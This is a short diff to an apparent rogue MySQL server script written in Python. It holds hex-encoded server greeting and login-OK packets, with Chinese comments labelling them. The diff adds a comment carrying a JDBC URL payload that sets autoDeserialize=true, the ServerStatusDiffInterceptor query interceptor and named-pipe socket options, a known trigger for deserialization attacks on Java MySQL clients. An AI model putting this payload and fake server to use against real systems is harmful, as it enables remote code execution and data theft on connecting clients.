@@ -1,4 +1,5 @@
 import binascii
+#?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory&namedPipePath=1.bin
 resp1 = "4a0000000a352e372e31300003000000197d13391608513800fff72d0200ff8115000000000000000000000e03157e78017608153a6a61006d7973716c5f6e61746976655f70617373776f726400" #服务器信息
 
 resp2 = "0700000200000002000000" #登录ok包
